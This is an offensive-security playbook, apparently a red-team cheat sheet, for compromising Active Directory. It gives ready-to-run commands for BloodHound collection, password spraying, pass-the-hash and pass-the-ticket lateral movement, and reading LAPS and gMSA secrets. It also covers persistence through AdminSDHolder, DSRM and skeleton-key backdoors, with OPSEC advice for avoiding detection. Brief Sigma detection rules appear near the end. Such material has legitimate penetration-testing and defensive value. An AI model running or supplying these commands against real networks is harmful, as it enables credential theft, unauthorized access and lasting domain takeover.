# BloodHound CE Enumeration, Lateral Movement & Domain Dominance

ATT&CK: T1482 (Domain Trust Discovery), T1069.002 (Permission Groups), T1550.002 (Pass-the-Hash),
T1550.003 (Pass-the-Ticket), T1003.001/.006 (LSASS/DCSync), T1098 (Account Manipulation).
CWE-732 (Incorrect Permission Assignment), CWE-522 (Insufficiently Protected Credentials).

## Theory / Mechanism

Active Directory exposes the relationship graph that adversaries traverse: every principal
(user/computer/gMSA), group, GPO, OU, container, trust and ACE is a node or edge. BloodHound
ingests SharpHound/AzureHound JSON into Neo4j and computes shortest attack paths to high-value
targets. Lateral movement then walks those edges using harvested secrets (NT hash, AES key,
Kerberos ticket, certificate, or cleartext) and SMB/WinRM/WMI/DCOM exec primitives.

## Modern 2024-2026 variants (verified)

- **BloodHound Community Edition v8 + OpenGraph (Jul 2025)** — monolithic Go API + React/Sigma.js
  front-end, Postgres app DB + Neo4j graph DB. OpenGraph lets you ingest *arbitrary* identity
  graphs (SaaS, Linux, cloud) via standardized JSON, so custom collectors no longer need a forked
  SharpHound. Cypher spans platforms (e.g. `LinuxNode -[SSHKey1..3]-> WindowsNode`).
- **CE collector split** — `bloodhound.py` legacy branch does **not** ingest into CE. Use the
  `bloodhound-ce` branch / `bloodhound-ce-python`, or NetExec's `--bloodhound` (wraps bh-python).
  Mixing legacy and CE collectors fails ingest.
- **SOAPHound / bofhound / ADExplorerSnapshot** — collect via ADWS (TCP 9389, open by default) or
  from a Sysinternals AD Explorer `.dat` to avoid the LDAP-query-burst detection heuristic.
- **NetExec (nxc)** replaced CrackMapExec as the maintained successor; modules: `laps`, `gmsa`,
  `ntdsutil`, `coerce_plus`, `bloodhound`, `daclread`.
- **LAPS v2 (Windows LAPS, `msLAPS-Password` / `msLAPS-EncryptedPassword`)** — DPAPI-encrypted;
  only principals in the encryption-authorized SID can decrypt. NetExec `laps` handles both v1
  (`ms-Mcs-AdmPwd`) and v2.

## Complete working commands

### Clock sync (mandatory for Kerberos)
```bash
nmap -sT <DC_IP> -p445 --script smb2-time          # read DC clock
sudo ntpdate <DC_IP>                                # or: sudo rdate -n <DC_IP>
# non-destructive alternative for a single command:
faketime -f "+8h" impacket-getTGT corp.local/user:'Pass'
```

### BloodHound CE collection
```bash
# Linux, CE-compatible collector
pipx install bloodhound-ce
bloodhound-ce-python -u user -p 'Pass' -d corp.local -dc dc01.corp.local -ns <DC_IP> -c All --zip

# NetExec ingestor (wraps bh-python)
nxc ldap <DC_IP> -u user -p 'Pass' --bloodhound --collection All --dns-server <DC_IP>

# Windows SharpHound CE (encrypt + prefix the zip)
.\SharpHound.exe -c All --zippassword 'p@ssw0rd' --outputprefix CORP --throttle 1000 --jitter 30

# Stealthier ADWS collection (no LDAP burst)
SOAPHound.exe --user corp\user --password 'Pass' --domain corp.local --dc dc01.corp.local --bloodhound -o ./out
```

### High-value Cypher (run in BloodHound CE search)
```cypher
// Mark compromised principals as Owned first (right-click -> Mark as Owned)
// Shortest paths from owned to Domain Admins
MATCH p=shortestPath((s)-[*1..]->(t:Group)) WHERE s.owned=true AND t.name STARTS WITH 'DOMAIN ADMINS@' RETURN p
// Principals with DCSync rights
MATCH (n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name
// Kerberoastable / AS-REP-roastable
MATCH (u:User) WHERE u.hasspn=true RETURN u.name
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name
// GenericWrite/GenericAll edges (-> RBCD or shadow creds)
MATCH p=(s)-[:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(c:Computer) WHERE s.owned=true RETURN p
// Unconstrained delegation hosts (TGT capture targets, key for CVE-2025-33073 chain)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

### Password spray (lockout-safe)
```bash
# Read domain lockout policy FIRST
nxc smb <DC_IP> -u user -p 'Pass' --pass-pol
# Kerbrute spray — one password, one round, well under threshold
kerbrute passwordspray -d corp.local --dc <DC_IP> users.txt 'Autumn2026!'
# NetExec with continue-on-success and explicit jitter between rounds
nxc smb <DC_IP> -u users.txt -p 'Autumn2026!' --continue-on-success --no-bruteforce
```

### Lateral movement
```bash
# Pass-the-Hash
nxc smb <TARGET> -u admin -H :<NTHASH> -x 'whoami'
impacket-wmiexec -hashes :<NTHASH> corp.local/admin@<TARGET>
impacket-psexec -hashes :<NTHASH> corp.local/admin@<TARGET>      # noisier: creates service

# Overpass-the-Hash (hash -> Kerberos TGT, then PtT)
impacket-getTGT corp.local/admin -hashes :<NTHASH>
export KRB5CCNAME=admin.ccache
impacket-wmiexec -k -no-pass corp.local/admin@<TARGET>

# Pass-the-Ticket (Windows: dump then inject)
Rubeus.exe triage
Rubeus.exe dump /nowrap
Rubeus.exe ptt /ticket:<base64>

# WinRM / DCOM exec primitives
evil-winrm -i <TARGET> -u admin -H <NTHASH>
impacket-dcomexec -object MMC20 -hashes :<NTHASH> corp.local/admin@<TARGET>
```

### LAPS & gMSA reads
```bash
# LAPS v1 + v2 (auto-detect)
nxc ldap <DC_IP> -u user -p 'Pass' -M laps
# gMSA managed password (-> NT hash for the gMSA)
nxc ldap <DC_IP> -u user -p 'Pass' --gmsa
python3 gMSADumper.py -u user -p 'Pass' -d corp.local
# bloodyAD: read any readable secret attribute
bloodyAD -d corp.local -u user -p 'Pass' --host <DC_IP> get object 'TARGET$' --attr ms-Mcs-AdmPwd
```

### Persistence (post-DA)
```bash
# AdminSDHolder ACL (re-applies to protected groups hourly via SDProp)
bloodyAD -d corp.local -u DA -p 'Pass' --host <DC_IP> add genericAll \
  'CN=AdminSDHolder,CN=System,DC=corp,DC=local' attacker
# DSRM backdoor: dump SAM hash + enable network logon
# mimikatz: token::elevate ; lsadump::sam
reg add 'HKLM\SYSTEM\CurrentControlSet\Control\LSA' /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# Skeleton key (volatile, in-memory only)
# mimikatz: privilege::debug ; misc::skeleton    -> password "mimikatz" works for all
```

## Detection

```yaml
title: BloodHound / SharpHound LDAP Collection Burst
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4662, AccessMask: '0x100' }   # Control Access / directory read
  timeframe: 1m
  condition: sel | count(ObjectName) by SubjectLogonId > 200
level: high
---
title: gMSA / LAPS Password Read by Non-Admin
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4662 }
  attr: { Properties|contains: ['ms-Mcs-AdmPwd','msLAPS-Password','msDS-ManagedPassword'] }
  condition: sel and attr
level: high
```
IOCs: ADWS 9389 connections from workstations; `SharpHound.exe`/`SOAPHound.exe` process names;
SMB session enumeration (NetSessionEnum) sweeps; `psexec`/`wmiexec` service+`__1234.tmp` artifacts;
4624 type-3 NTLM logons from atypical source hosts.

## OPSEC

- Collection touches LDAP/ADWS/SMB-session APIs heavily — use `--throttle`/`--jitter`, prefer ADWS,
  scope `-c` to only what you need (`Group,LocalAdmin,Session` rather than `All`) in monitored envs.
- `psexec` is loud (creates+deletes a service, drops a binary). Prefer `wmiexec`/`dcomexec`/WinRM.
- Skeleton Key is RAM-only (lost on reboot, breaks AES-only auth) — note it but avoid on prod DCs.
- AdminSDHolder/DSRM changes are durable AD modifications — document, get approval, and clean up.
- Clean up: remove uploaded SharpHound zips, kill injected tickets (`klist purge`), delete created
  machine accounts and ACL grants, restore DsrmAdminLogonBehavior.

## References
- SpecterOps — "BloodHound CE v8 Launches with OpenGraph" (specterops.io/blog, Jul 29 2025)
- SpecterOps docs — SharpHound Community Edition collection (bloodhound.specterops.io)
- Pennyw0rth/NetExec wiki — `laps`, `gmsa`, `bloodhound` modules (netexec.wiki)
- m4lwhere — "The Ultimate Guide for BloodHound Community Edition (BHCE)"
